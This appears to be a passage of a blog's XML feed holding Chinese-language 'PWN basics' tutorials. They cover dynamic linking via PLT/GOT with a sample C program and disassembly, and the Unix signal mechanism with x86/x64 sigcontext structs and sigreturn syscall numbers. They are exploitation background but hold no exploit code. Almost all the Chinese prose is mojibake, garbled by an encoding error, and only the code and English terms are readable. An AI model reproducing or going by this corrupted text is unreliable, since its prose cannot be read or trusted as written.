data-language="C"><code class="language-C">#include &lt;stdio.h&gt;void print_banner()&#123;    printf(&quot;Welcome to World of PLT and GOT\n&quot;);&#125;int main(void)&#123;    print_banner();    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>ç¼–è¯‘</em></p><blockquote><p><code>gcc -Wall -g -o test.o -c test.c -m32</code></p></blockquote><p><em>é“¾æ¥</em></p><blockquote><p><code>gcc -o test test.o -m32</code></p><p>æ³¨æ„ï¼šç°ä»£Linuxç³»ç»Ÿéƒ½æ˜¯x86_64ç³»ç»Ÿäº†ï¼Œåé¢éœ€è¦å¯¹ä¸­é—´æ–‡ä»¶test.oä»¥åŠå¯æ‰§è¡Œæ–‡ä»¶teståç¼–è¯‘ï¼Œåˆ†ææ±‡ç¼–æŒ‡ä»¤ï¼Œå› æ­¤åœ¨è¿™é‡Œä½¿ç”¨-m32é€‰é¡¹ç”Ÿæˆi386æ¶æ„æŒ‡ä»¤è€Œéx86_64æ¶æ„æŒ‡ä»¤ã€‚</p></blockquote><p>ç»ç¼–è¯‘å’Œé“¾æ¥é˜¶æ®µä¹‹åï¼Œtestå¯æ‰§è¡Œæ–‡ä»¶ä¸­print_bannerå‡½æ•°çš„æ±‡ç¼–æŒ‡ä»¤ä¼šæ˜¯æ€æ ·çš„å‘¢ï¼Ÿæˆ‘çŒœåº”è¯¥ä¸ä¸‹é¢çš„æ±‡ç¼–ç±»ä¼¼ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">080483cc &lt;print_banner&gt;: 80483cc:    push %ebp 80483cd:    mov  %esp, %ebp 80483cf:    sub  $0x8, %esp 80483d2:    sub  $0xc, %esp 80483d5:    push $0x80484a8   80483da:    call **&lt;printfå‡½æ•°çš„åœ°å€&gt;** 80483df:    add $0x10, %esp 80483e2:    nop 80483e3:    leave 80483e4:    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>print_bannerå‡½æ•°å†…è°ƒç”¨äº†printfå‡½æ•°ï¼Œè€Œprintfå‡½æ•°ä½äºglibcåŠ¨æ€åº“å†…ï¼Œæ‰€ä»¥åœ¨ç¼–è¯‘å’Œé“¾æ¥é˜¶æ®µï¼Œé“¾æ¥å™¨æ— æ³•çŸ¥çŸ¥é“è¿›ç¨‹è¿è¡Œèµ·æ¥ä¹‹åprintfå‡½æ•°çš„åŠ è½½åœ°å€ã€‚æ•…ä¸Šè¿°çš„<code>**&lt;printfå‡½æ•°åœ°å€&gt;**</code>ä¸€é¡¹æ˜¯æ— æ³•å¡«å……çš„ï¼Œåªæœ‰è¿›ç¨‹è¿è¿è¡Œåï¼Œprintfå‡½æ•°çš„åœ°å€æ‰èƒ½ç¡®å®šã€‚<br>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼šè¿›ç¨‹è¿è¡Œèµ·æ¥ä¹‹åï¼ŒglibcåŠ¨æ€åº“ä¹Ÿè£…è½½äº†ï¼Œprintfå‡½æ•°åœ°å€äº¦å·²ç¡®å®šï¼Œä¸Šè¿°callæŒ‡ä»¤å¦‚ä½•ä¿®æ”¹ï¼ˆé‡å®šä½ï¼‰å‘¢ï¼Ÿ<br>ä¸€ä¸ªç®€å•çš„æ–¹æ³•å°±æ˜¯å°†æŒ‡ä»¤ä¸­çš„<code>**&lt;printfå‡½æ•°åœ°å€&gt;**</code>ä¿®æ”¹printfå‡½æ•°çš„çœŸæ­£åœ°å€å³å¯ã€‚<br>ä½†è¿™ä¸ªæ–¹æ¡ˆé¢ä¸´ä¸¤ä¸ªé—®é¢˜ï¼š</p><ul><li>ç°ä»£æ“ä½œç³»ç»Ÿä¸å…è®¸ä¿®æ”¹ä»£ç æ®µï¼Œåªèƒ½ä¿®æ”¹æ•°æ®æ®µ</li><li>å¦‚æœprint_bannerå‡½æ•°æ˜¯åœ¨ä¸€ä¸ªåŠ¨æ€åº“ï¼ˆ.soå¯¹è±¡ï¼‰å†…ï¼Œä¿®æ”¹äº†ä»£ç æ®µï¼Œé‚£ä¹ˆå®ƒå°±æ— æ³•åšåˆ°ç³»ç»Ÿå†…æ‰€æœ‰è¿›ç¨‹å…±äº«åŒä¸€ä¸ªåŠ¨æ€åº“ã€‚<br>å› æ­¤ï¼Œprintfå‡½æ•°åœ°å€åªèƒ½å›å†™åˆ°æ•°æ®æ®µå†…ï¼Œè€Œä¸èƒ½å›å†™åˆ°ä»£ç æ®µä¸Šã€‚</li></ul><p>æ³¨æ„ï¼šåˆšæ‰è°ˆåˆ°çš„å›å†™ï¼Œæ˜¯æŒ‡è¿è¡Œæ—¶ä¿®æ”¹ï¼Œæ›´ä¸“ä¸šçš„ç§°è°“åº”è¯¥æ˜¯<em>è¿è¡Œæ—¶é‡å®šä½</em>ï¼Œä¸ä¹‹ç›¸å¯¹åº”çš„è¿˜æœ‰<em>é“¾æ¥æ—¶é‡å®šä½</em>ã€‚<br>è¯´åˆ°è¿™é‡Œï¼Œéœ€è¦æŠŠç¼–è¯‘é“¾æ¥è¿‡ç¨‹å†å±•å¼€ä¸€ä¸‹ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œæ¯ä¸ªç¼–è¯‘å•å…ƒï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ª.cæ–‡ä»¶ï¼Œæ¯”å¦‚å‰é¢ä¾‹å­ä¸­çš„test.cï¼‰éƒ½ä¼šç»å†ç¼–è¯‘å’Œé“¾æ¥ä¸¤ä¸ªé˜¶æ®µã€‚<br>ç¼–è¯‘é˜¶æ®µæ˜¯å°†.cæºä»£ç ç¿»è¯‘æˆæ±‡ç¼–æŒ‡ä»¤çš„ä¸­é—´æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸Šè¿°çš„test.cæ–‡ä»¶ï¼Œç»è¿‡ç¼–è¯‘ä¹‹åï¼Œç”Ÿæˆtest.oä¸­é—´æ–‡ä»¶ã€‚print_bannerå‡½æ•°çš„æ±‡ç¼–æŒ‡ä»¤å¦‚ä¸‹ï¼ˆä½¿ç”¨å¼ºè°ƒå†…å®¹<em>objdump -d test.o</em>å‘½ä»¤å³å¯è¾“å‡ºï¼‰ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">00000000 &lt;print_banner&gt;:      0:  55                   push %ebp      1:  89 e5                mov %esp, %ebp      3:  83 ec 08             sub   $0x8, %esp      6:  c7 04 24 00 00 00 00 movl  $0x0, (%esp)      d:  e8 fc ff ff ff       call  e &lt;print_banner+0xe&gt;     12:  c9                   leave     13:  c3                   ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>æ˜¯å¦æ³¨æ„åˆ°callæŒ‡ä»¤çš„æ“ä½œæ•°æ˜¯fc ff ff ffï¼Œç¿»è¯‘æˆ16è¿›åˆ¶æ•°æ˜¯0xfffffffcï¼ˆx86æ¶æ„æ˜¯å°ç«¯çš„å­—èŠ‚åºï¼‰ï¼Œçœ‹æˆæœ‰ç¬¦å·æ˜¯-4ã€‚è¿™é‡Œåº”è¯¥å­˜æ”¾printfå‡½æ•°çš„åœ°å€ï¼Œä½†ç”±äºç¼–è¯‘é˜¶æ®µæ— æ³•çŸ¥é“printfå‡½æ•°çš„åœ°å€ï¼Œæ‰€ä»¥é¢„å…ˆæ”¾ä¸€ä¸ª-4åœ¨è¿™é‡Œï¼Œç„¶åç”¨é‡å®šä½é¡¹æ¥æè¿°ï¼š<strong>è¿™ä¸ªåœ°å€åœ¨é“¾æ¥æ—¶è¦ä¿®æ­£ï¼Œå®ƒçš„ä¿®æ­£å€¼æ˜¯æ ¹æ®printfåœ°å€ï¼ˆæ›´ç¡®åˆ‡çš„å«æ³•åº”è¯¥æ˜¯ç¬¦å·ï¼Œé“¾æ¥å™¨çœ¼ä¸­åªæœ‰ç¬¦å·ï¼Œæ²¡æœ‰æ‰€è°“çš„å‡½æ•°å’Œå˜é‡ï¼‰æ¥ä¿®æ­£ï¼Œå®ƒçš„ä¿®æ­£æ–¹å¼æŒ‰ç›¸å¯¹å¼•ç”¨æ–¹å¼ã€‚</strong></p><p>è¿™ä¸ªè¿‡ç¨‹ç§°ä¸º<em>é“¾æ¥æ—¶é‡å®šä½</em>ï¼Œä¸åˆšæ‰æåˆ°çš„è¿è¡Œæ—¶é‡å®šä½å·¥ä½œåŸç†å®Œå…¨ä¸€æ ·ï¼Œåªæ˜¯ä¿®æ­£æ—¶æœºä¸åŒã€‚</p><p><em>é“¾æ¥é˜¶æ®µ</em>æ˜¯å°†ä¸€ä¸ªæˆ–è€…å¤šä¸ªä¸­é—´æ–‡ä»¶ï¼ˆ.oæ–‡ä»¶ï¼‰é€šè¿‡é“¾æ¥å™¨å°†å®ƒä»¬é“¾æ¥æˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé“¾æ¥é˜¶æ®µä¸»è¦å®Œæˆä»¥ä¸‹äº‹æƒ…ï¼š</p><blockquote><p>-å„ä¸ªä¸­é—´æ–‡ä¹‹é—´çš„åŒåsectionåˆå¹¶</p><ul><li>å¯¹ä»£ç æ®µï¼Œæ•°æ®æ®µä»¥åŠå„ç¬¦å·è¿›è¡Œåœ°å€åˆ†é…</li><li>é“¾æ¥æ—¶é‡å®šä½ä¿®æ­£</li></ul></blockquote><p>é™¤äº†é‡å®šä½è¿‡ç¨‹ï¼Œå…¶å®ƒåŠ¨ä½œæ˜¯æ— æ³•ä¿®æ”¹ä¸­é—´æ–‡ä»¶ä¸­å‡½æ•°ä½“å†…æŒ‡ä»¤çš„ï¼Œè€Œé‡å®šä½è¿‡ç¨‹ä¹Ÿåªèƒ½æ˜¯ä¿®æ”¹æŒ‡ä»¤ä¸­çš„æ“ä½œæ•°ï¼Œæ¢å¥è¯è¯´ï¼Œ<strong>é“¾æ¥è¿‡ç¨‹æ— æ³•ä¿®æ”¹ç¼–è¯‘è¿‡ç¨‹ç”Ÿæˆçš„æ±‡ç¼–æŒ‡ä»¤ã€‚</strong><br>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼š<strong>ç¼–è¯‘é˜¶æ®µæ€ä¹ˆçŸ¥é“printfå‡½æ•°æ˜¯åœ¨glibcè¿è¡Œåº“çš„ï¼Œè€Œä¸æ˜¯å®šä¹‰åœ¨å…¶å®ƒ.oä¸­</strong><br>ç­”æ¡ˆï¼š<strong>ç¼–è¯‘å™¨æ˜¯æ— æ³•çŸ¥é“çš„</strong></p><p>é‚£ä¹ˆç¼–è¯‘å™¨åªèƒ½è€è€å®å®åœ°ç”Ÿæˆè°ƒç”¨printfçš„æ±‡ç¼–æŒ‡ä»¤ï¼Œprintfæ˜¯åœ¨glibcåŠ¨æ€åº“å®šä½ï¼Œæˆ–è€…æ˜¯åœ¨å…¶å®ƒ.oå®šä¹‰è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œå®ƒéƒ½èƒ½å·¥ä½œã€‚å¦‚æœæ˜¯åœ¨å…¶å®ƒ.oä¸­å®šä¹‰äº†printfå‡½æ•°ï¼Œé‚£åœ¨é“¾æ¥é˜¶æ®µï¼Œprintfåœ°å€å·²ç»ç¡®å®šï¼Œå¯ä»¥ç›´æ¥é‡å®šä½ã€‚å¦‚æœprintfå®šä¹‰åœ¨åŠ¨æ€åº“å†…ï¼ˆé“¾æ¥é˜¶æ®µæ˜¯å¯ä»¥çŸ¥é“printfåœ¨å“ªå®šä¹‰çš„ï¼Œåªæ˜¯å¦‚æœå®šä¹‰åœ¨åŠ¨æ€åº“å†…ä¸çŸ¥é“å®ƒçš„åœ°å€è€Œå·²ï¼‰ï¼Œé“¾æ¥é˜¶æ®µæ— æ³•åšé‡å®šä½ã€‚</p><p>æ ¹æ®å‰é¢è®¨è®ºï¼Œè¿è¡Œæ—¶é‡å®šä½æ˜¯æ— æ³•ä¿®æ”¹ä»£ç æ®µçš„ï¼Œåªèƒ½å°†printfé‡å®šä½åˆ°æ•°æ®æ®µã€‚é‚£åœ¨ç¼–è¯‘é˜¶æ®µå°±å·²ç”Ÿæˆå¥½çš„callæŒ‡ä»¤ï¼Œæ€ä¹ˆæ„ŸçŸ¥è¿™ä¸ªå·²é‡å®šä½å¥½çš„æ•°æ®æ®µå†…å®¹å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯ï¼š<strong>é“¾æ¥å™¨ç”Ÿæˆä¸€æ®µé¢å¤–çš„å°ä»£ç ç‰‡æ®µï¼Œé€šè¿‡è¿™æ®µä»£ç æ”¯è·å–printfå‡½æ•°åœ°å€ï¼Œå¹¶å®Œæˆå¯¹å®ƒçš„è°ƒç”¨ã€‚</strong><br>é“¾æ¥å™¨ç”Ÿæˆé¢å¤–çš„ä¼ªä»£ç å¦‚ä¸‹ï¼š<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">.text...&#x2F;&#x2F; è°ƒç”¨printfçš„callæŒ‡ä»¤call printf_stub...printf_stub:    mov rax, [printfå‡½æ•°çš„å‚¨å­˜åœ°å€] &#x2F;&#x2F; è·å–printfé‡å®šä½ä¹‹åçš„åœ°å€    jmp rax &#x2F;&#x2F; è·³è¿‡å»æ‰§è¡Œprintfå‡½æ•°.data...printfå‡½æ•°çš„å‚¨å­˜åœ°å€ï¼šã€€ã€€è¿™é‡Œå‚¨å­˜printfå‡½æ•°é‡å®šä½åçš„åœ°å€<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>é“¾æ¥é˜¶æ®µå‘ç°printfå®šä¹‰åœ¨åŠ¨æ€åº“æ—¶ï¼Œé“¾æ¥å™¨ç”Ÿæˆä¸€æ®µå°ä»£ç print_stubï¼Œç„¶åprintf_stubåœ°å€å–ä»£åŸæ¥çš„printfã€‚å› æ­¤è½¬åŒ–ä¸ºé“¾æ¥é˜¶æ®µå¯¹printf_stubåšé“¾æ¥é‡å®šä½ï¼Œè€Œè¿è¡Œæ—¶æ‰å¯¹printfåšè¿è¡Œæ—¶é‡å®šä½ã€‚</p><h3 id="PLT-amp-GOT"><a href="#PLT-amp-GOT" class="headerlink" title="PLT &amp; GOT"></a>PLT &amp; GOT</h3><p>å‰é¢ç”±ä¸€ä¸ªç®€å•çš„ä¾‹å­è¯´æ˜åŠ¨æ€é“¾æ¥éœ€è¦è€ƒè™‘çš„å„ç§å› ç´ ï¼Œä½†å®é™…æ€»ç»“èµ·æ¥è¯´ä¸¤ç‚¹ï¼š</p><blockquote><ul><li>éœ€è¦å­˜æ”¾å¤–éƒ¨å‡½æ•°çš„æ•°æ®æ®µ</li><li>è·å–æ•°æ®æ®µå­˜æ”¾å‡½æ•°åœ°å€çš„ä¸€å°æ®µé¢å¤–ä»£ç </li></ul></blockquote><p>å¦‚æœå¯æ‰§è¡Œæ–‡ä»¶ä¸­è°ƒç”¨å¤šä¸ªåŠ¨æ€åº“å‡½æ•°ï¼Œé‚£æ¯ä¸ªå‡½æ•°éƒ½éœ€è¦è¿™ä¸¤æ ·ä¸œè¥¿ï¼Œè¿™æ ·æ¯æ ·ä¸œè¥¿å°±å½¢æˆä¸€ä¸ªè¡¨ï¼Œæ¯ä¸ªå‡½æ•°ä½¿ç”¨ä¸­çš„ä¸€é¡¹ã€‚</p><p>æ€»ä¸èƒ½æ¯æ¬¡éƒ½å«è¿™ä¸ªè¡¨é‚£ä¸ªè¡¨ï¼Œäºæ˜¯å¾—æ­£åã€‚å­˜æ”¾å‡½æ•°åœ°å€çš„æ•°æ®è¡¨ï¼Œç§°ä¸º<em>é‡å±€åç§»è¡¨ï¼ˆGOT, Global Offset Tableï¼‰</em>ï¼Œè€Œé‚£ä¸ªé¢å¤–ä»£ç æ®µè¡¨ï¼Œç§°ä¸º<em>ç¨‹åºé“¾æ¥è¡¨ï¼ˆPLTï¼ŒProcedure Link Tableï¼‰</em>ã€‚</p><p><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250120211843.png" alt="Pasted image 20250120211843"><br>å½“ç„¶è¿™ä¸ªåŸç†å›¾å¹¶ä¸æ˜¯Linuxä¸‹çš„PLT/GOTçœŸå®è¿‡ç¨‹ï¼ŒLinuxä¸‹çš„PLT/GOTè¿˜æœ‰æ›´å¤šç»†èŠ‚è¦è€ƒè™‘äº†ã€‚è¿™ä¸ªå›¾åªæ˜¯å°†è¿™äº›èºå£°å…¨éƒ¨æ¶ˆé™¤ï¼Œè®©å¤§å®¶æ˜ç¡®çœ‹åˆ°PLT/GOTæ˜¯å¦‚ä½•ç©¿é’ˆå¼•çº¿çš„ã€‚</p><h2 id="å›¾è§£"><a href="#å›¾è§£" class="headerlink" title="å›¾è§£"></a>å›¾è§£</h2><p>ç¨‹åºå¼€å§‹æ‰§è¡Œæ—¶ï¼Œ.pltèŠ‚å’Œ.got.pltèŠ‚çš„çŠ¶æ€å¦‚ä¸‹ï¼š<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250127193949.png" alt="Pasted image 20250127193949"></p><ul><li><code>printf@plt</code>æ˜¯æŒ‡pltèŠ‚ä¸­ä¸printfç›¸å…³ä»£ç çš„åœ°å€ï¼Œ<code>printf@got</code>åŒç†ï¼›</li><li><code>printf@plt+6</code>æ°å¥½æ˜¯<code>get_address</code>çš„é¦–åœ°å€ï¼›</li><li><code>*(printf@got)</code>æ˜¯æŒ‡åœ°å€ä¸º<code>printf@got</code>çš„å†…å­˜å•å…ƒä¸­çš„æ•°æ®ï¼ˆå›¾ä¸­ä¸º<code>printf@plt+6</code>ï¼‰</li><li><code>get_address</code>æ˜¯ä¸€ç³»åˆ—æ“ä½œï¼Œè¯¥æ“ä½œçš„åŠŸèƒ½æ˜¯å°†printfåœ¨å†…å­˜ä¸­çš„å®é™…åœ°å€å¡«å†™åˆ°<code>printf@got</code>è¿™ä¸€åœ°å€å¯¹åº”çš„å†…å­˜å•å…ƒä¸­ã€‚</li></ul><p>é¦–æ¬¡è°ƒç”¨printfçš„ç¨‹åºæ‰§è¡Œæµå¦‚ä¸‹ï¼š<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250127194035.png" alt="Pasted image 20250127194035"></p><ul><li>â‘ ï¼šç¨‹åºæ‰§è¡Œè‡³<code>call printf@plt</code>ï¼Œå› æ­¤è·³è½¬è‡³ç›¸åº”åœ°å€ï¼›</li><li>â‘¡ï¼šè·³è½¬åˆ°<code>printf@plt</code>åï¼Œæ‰§è¡Œ<code>jmp *(printf@got)</code>ï¼Œä½†ç”±äº<code>printf@got</code>ä¿å­˜çš„æ•°æ®æ˜¯<code>printf@plt+6</code>ï¼Œå› æ­¤ç¨‹åºåˆè·³è½¬è‡³get_addressçš„é¦–åœ°å€ï¼›</li><li>â‘¢ï¼šç¨‹åºæ‰§è¡Œ<code>get_address</code>ï¼Œå°†printfçš„çœŸå®åœ°å€å†™å…¥<code>printf@got</code>ä¸­ï¼ˆå›¾ä¸­æœªä½“ç°ï¼‰</li></ul><p>å½“å®Œæˆä¸Šè¿°æ“ä½œåï¼Œç¨‹åºä¾¿èƒ½ç¬¬ä¸€æ¬¡æ‰§è¡Œprintfã€‚å¹¶ä¸”æ­¤æ—¶.pltèŠ‚å’Œ.got.pltèŠ‚çš„çŠ¶æ€å˜ä¸ºï¼š<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250127194210.png" alt="Pasted image 20250127194210"><br>å¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶printf@gotä¸­ä¿å­˜çš„åœ°å€å˜ä¸ºäº†printfçœŸæ­£çš„é¦–åœ°å€ã€‚<br>æ˜¾ç„¶ï¼Œåç»­å†æ¬¡æ‰§è¡Œ<code>jmp *(printf@got)</code>å‘½ä»¤æ—¶ï¼Œç¨‹åºå¯ä»¥ç›´æ¥è·³è½¬è‡³printfçš„é¦–åœ°å€ï¼Œå¹¶æ‰§è¡Œç›¸å…³å‘½ä»¤ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåŸºç¡€-something_about_æ“ä½œç³»ç»Ÿ</title>
      <link href="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-something-about-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
      <url>/2025/02/09/PWN%E5%9F%BA%E7%A1%80-something-about-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="æ“ä½œç³»ç»Ÿ"><a href="#æ“ä½œç³»ç»Ÿ" class="headerlink" title="æ“ä½œç³»ç»Ÿ"></a>æ“ä½œç³»ç»Ÿ</h2><h3 id="signalæœºåˆ¶"><a href="#signalæœºåˆ¶" class="headerlink" title="signalæœºåˆ¶"></a>signalæœºåˆ¶</h3><p><strong>signal æœºåˆ¶æ˜¯ç±» unix ç³»ç»Ÿä¸­è¿›ç¨‹ä¹‹é—´<em>ç›¸äº’ä¼ é€’ä¿¡æ¯</em>çš„ä¸€ç§æ–¹æ³•</strong>ã€‚ä¸€èˆ¬ï¼Œæˆ‘ä»¬ä¹Ÿç§°å…¶ä¸º<strong>è½¯ä¸­æ–­ä¿¡å·</strong>ï¼Œæˆ–è€…<strong>è½¯ä¸­æ–­</strong>ã€‚æ¯”å¦‚è¯´ï¼Œè¿›ç¨‹ä¹‹é—´å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨ kill æ¥å‘é€è½¯ä¸­æ–­ä¿¡å·ã€‚ä¸€èˆ¬åˆ†ä¸ºä¸‰å¤§æ­¥ï¼š</p><blockquote><p>killå¹¶ä¸æ˜¯å­—é¢æ„æ€â€”â€”æ€æ­»è¿›ç¨‹<br>KILLåŠŸèƒ½æè¿°ï¼šç”¨äºå‘ä»»ä½•è¿›ç¨‹ç»„æˆ–è¿›ç¨‹å‘é€ä¿¡å·</p><ol><li>å†…æ ¸å‘æŸä¸ªè¿›ç¨‹<strong>å‘é€signalæœºåˆ¶</strong>ï¼Œè¯¥è¿›ç¨‹ä¼šè¢«æš‚æ—¶<strong>æŒ‚èµ·ï¼Œè¿›å…¥å†…æ ¸æ€</strong></li><li>å†…æ ¸ä¼šä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œ<strong>è·³è½¬åˆ°ä¹‹å‰æ³¨å†Œå¥½çš„signal handlerä¸­å¤„ç†signal</strong></li><li><strong>signalè¿”å›</strong></li><li>å†…æ ¸ä¸ºè¿›ç¨‹æ¢å¤ä¹‹å‰ä¿ç•™çš„ä¸Šä¸‹æ–‡ï¼Œæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œ<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-something-about-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Pasted image 20250207175656.png" alt="Pasted image 20250207175656"><br>å†…æ ¸åœ¨ä¿å­˜è¿›ç¨‹ç›¸åº”ä¸Šä¸‹æ–‡é˜¶æ®µ<strong>ä¸»è¦æ˜¯å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥ signal ä¿¡æ¯ï¼Œä»¥åŠæŒ‡å‘ sigreturn çš„ç³»ç»Ÿè°ƒç”¨åœ°å€</strong>ã€‚æ­¤æ—¶æ ˆçš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ç§° ucontext ä»¥åŠ siginfo è¿™ä¸€æ®µä¸º <strong>Signal Frame</strong>ã€‚<em>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„</em>ã€‚ä¹‹åä¼šè·³è½¬åˆ°æ³¨å†Œè¿‡çš„ signal handler ä¸­å¤„ç†ç›¸åº”çš„ signalã€‚å› æ­¤ï¼Œå½“ signal handler æ‰§è¡Œå®Œä¹‹åï¼Œå°±ä¼šæ‰§è¡Œ sigreturn ä»£ç ã€‚<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-something-about-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Pasted image 20250207175647.png" alt="Pasted image 20250207175647"><br>å¯¹äº signal Frame æ¥è¯´ï¼Œä¼šå› ä¸ºæ¶æ„çš„ä¸åŒè€Œæœ‰æ‰€åŒºåˆ«ï¼Œè¿™é‡Œç»™å‡ºåˆ†åˆ«ç»™å‡º x86 ä»¥åŠ x64 çš„ sigcontext</li></ol><ul><li>x86<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;x86struct sigcontext&#123;  unsigned short gs, __gsh;  unsigned short fs, __fsh;  unsigned short es, __esh;  unsigned short ds, __dsh;  unsigned long edi;  unsigned long esi;  unsigned long ebp;  unsigned long esp;  unsigned long ebx;  unsigned long edx;  unsigned long ecx;  unsigned long eax;  unsigned long trapno;  unsigned long err;  unsigned long eip;  unsigned short cs, __csh;  unsigned long eflags;  unsigned long esp_at_signal;  unsigned short ss, __ssh;  struct _fpstate * fpstate;  unsigned long oldmask;  unsigned long cr2;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></blockquote><ul><li>x64<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;x64struct _fpstate&#123;  &#x2F;* FPU environment matching the 64-bit FXSAVE layout.  *&#x2F;  __uint16_t        cwd;  __uint16_t        swd;  __uint16_t        ftw;  __uint16_t        fop;  __uint64_t        rip;  __uint64_t        rdp;  __uint32_t        mxcsr;  __uint32_t        mxcr_mask;  struct _fpxreg    _st[8];  struct _xmmreg    _xmm[16];  __uint32_t        padding[24];&#125;;struct sigcontext&#123;  __uint64_t r8;  __uint64_t r9;  __uint64_t r10;  __uint64_t r11;  __uint64_t r12;  __uint64_t r13;  __uint64_t r14;  __uint64_t r15;  __uint64_t rdi;  __uint64_t rsi;  __uint64_t rbp;  __uint64_t rbx;  __uint64_t rdx;  __uint64_t rax;  __uint64_t rcx;  __uint64_t rsp;  __uint64_t rip;  __uint64_t eflags;  unsigned short cs;  unsigned short gs;  unsigned short fs;  unsigned short __pad0;  __uint64_t err;  __uint64_t trapno;  __uint64_t oldmask;  __uint64_t cr2;  __extension__ union    &#123;      struct _fpstate * fpstate;      __uint64_t __fpstate_word;    &#125;;  __uint64_t __reserved1 [8];&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>signal handler è¿”å›åï¼Œå†…æ ¸ä¸ºæ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…æ‹¬å°†æ‰€æœ‰å‹å…¥çš„å¯„å­˜å™¨ï¼Œé‡æ–° pop å›å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚å…¶ä¸­ï¼Œ32 ä½çš„ sigreturn çš„è°ƒç”¨å·ä¸º 119(0x77)ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15(0xf)ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ“ä½œç³»ç»Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåŸºç¡€-bssæ®µã€dataæ®µã€textæ®µã€å †(heap)å’Œæ ˆ(stack)</title>
      <link href="/2025/02/08/PWN%E5%9F%BA%E7%A1%80-bss%E6%AE%B5%E3%80%81data%E6%AE%B5%E3%80%81text%E6%AE%B5%E3%80%81%E5%A0%86-heap-%E5%92%8C%E6%A0%88-stack/"/>
      <url>/2025/02/08/PWN%E5%9F%BA%E7%A1%80-bss%E6%AE%B5%E3%80%81data%E6%AE%B5%E3%80%81text%E6%AE%B5%E3%80%81%E5%A0%86-heap-%E5%92%8C%E6%A0%88-stack/</url>
      
